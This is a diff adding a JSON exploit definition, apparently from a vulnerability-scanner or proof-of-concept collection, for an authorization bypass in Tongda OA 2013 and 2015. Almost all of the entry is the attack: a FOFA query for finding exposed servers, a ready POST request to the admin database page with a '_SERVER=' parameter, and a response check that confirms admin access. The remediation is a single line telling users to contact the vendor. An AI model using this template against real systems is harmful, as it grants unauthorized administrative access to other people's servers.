@@ -1,0 +1,35 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA 越权访问",
+  "type": "访问控制",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "将get型访问转换成post,并且post参数_SERVER,即可越权访问admin才能访问的⻚面。根据⽹上的通达 OA的源码找这些敏感地址,如: /general/system/database/",
+  "version": "2013、2015版本",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"TDXK-通达OA\""
+  },
+  "protocol": "http",
+  "link": "https://www.hacking8.com/bug-web/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE.html",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/general/system/database/",
+      "data": "_SERVER="
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "数据库管理"
+        }
+      ]
+    }
+  }
+}
